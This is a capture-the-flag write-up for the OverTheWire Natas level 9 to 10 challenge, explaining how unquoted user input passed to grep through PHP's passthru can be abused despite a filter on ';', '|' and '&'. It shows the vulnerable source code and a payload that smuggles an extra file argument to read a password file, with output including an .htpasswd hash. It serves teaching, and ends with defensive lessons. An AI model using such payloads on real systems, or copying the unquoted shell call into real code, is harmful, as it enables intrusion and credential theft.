---
title: "Level 9 -> Level 10"
description: "Bypass a partial command-injection filter by using grep with an extra file argument."
date: 2026-09-11
platform: OverTheWire
game: Natas
level: "9 -> 10"
difficulty: Easy
category: Web
tags:
  - Web
  - PHP
  - Command Injection
  - Source Code
  - Beginner
---

## Challenge

Log in to Natas level 10 and locate the password for the next level.

```txt title="Credentials"
Username: natas10
URL:      http://natas10.natas.labs.overthewire.org
```

## Enumeration

After logging in, the page shows this message:

```txt title="Page message"
For security reasons, we now filter on certain characters

Find words containing:
```

If we view the source code, we can see that the input is checked before it is passed to the command:

```php title="Source code"
<pre>
<?
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    if(preg_match('/[;|&]/',$key)) {
        print "Input contains an illegal character!";
    } else {
        passthru("grep -i $key dictionary.txt");
    }
}
?>
</pre>
```

The previous level used `;` to chain another command, but this level blocks `;`, `|`, and `&`.

Searching for `needle` still works:

```txt title="Search result"
Warning:  preg_match(): Allocation of JIT memory failed, PCRE JIT will be disabled. This is likely caused by security restrictions. Either grant PHP permission to allocate executable memory, or set pcre.jit=0 in /var/www/natas/natas10/index.php on line 31

needle
needle's
needled
needles
needless
needlessly
needlework
needlework's
```

The warning is from PHP's PCRE/JIT configuration on the server. It is noisy, but it does not stop the search from running.

Even though command chaining is blocked, our input is still inserted into this command without quotes:

```sh title="Command built by the server"
grep -i $key dictionary.txt
```

That means we can still control the arguments passed to `grep`.

## Exploitation

From earlier Natas levels, we know the next password is stored at:

```txt title="Password path"
/etc/natas_webpass/natas11
```

Instead of running a second command, we can make `grep` search another file. 

`grep` needs a search pattern first. The server runs:

```sh title="Command template"
grep -i $key dictionary.txt
```

So if we enter this payload:

```txt title="Payload"
.* /etc/natas_webpass/natas11 #
```

the command becomes roughly:

```sh title="Resulting command"
grep -i .* /etc/natas_webpass/natas11 # dictionary.txt
```

In `grep`, the first argument after `-i` is the pattern to search for. Here, `.*` is a regular expression:

```txt title="Regex meaning"
.   matches any single character
*   repeats the previous token zero or more times
.*  matches anything
```

That broad pattern matches every line, including the password line. We use it because we do not know the password yet, so we need a pattern that will match whatever is inside `/etc/natas_webpass/natas11`.

The input is unquoted, so we can add `/etc/natas_webpass/natas11` as another file argument:

```txt title="Payload"
.* /etc/natas_webpass/natas11 #
```

Payload syntax:

```txt title="Payload syntax"
.*                              # pattern that matches lines
/etc/natas_webpass/natas11      # extra file for grep to search
#                               # comment out the original dictionary.txt argument
```

The `#` comments out the original `dictionary.txt` argument. The page prints the matching line from the password file:

```txt title="Output"
Warning:  preg_match(): Allocation of JIT memory failed, PCRE JIT will be disabled. This is likely caused by security restrictions. Either grant PHP permission to allocate executable memory, or set pcre.jit=0 in /var/www/natas/natas10/index.php on line 31

.htaccess:AuthType Basic
.htaccess: AuthName "Authentication required"
.htaccess: AuthUserFile /var/www/natas/natas10/.htpasswd
.htaccess: require valid-user
.htpasswd:natas10:$apr1$GjJrZSXm$c7dyRbxL18bm5OMFXHg2W0
/etc/natas_webpass/natas11:[NextLevelPassword]
```

The extra `.htaccess` and `.htpasswd` lines appear because `.*` can be expanded by the shell before `grep` runs. The important line is the one from `/etc/natas_webpass/natas11`.

The real password is intentionally omitted from this public writeup. Run the steps above to retrieve it yourself.

## Lessons learned


:::tip[Key takeaways]

- Blocking a few shell metacharacters is not enough to make shell execution safe.
- Unquoted input can still change command arguments, even without `;`, `|`, or `&`.
- When user input must be passed to shell commands, avoid the shell where possible or escape arguments correctly.

:::
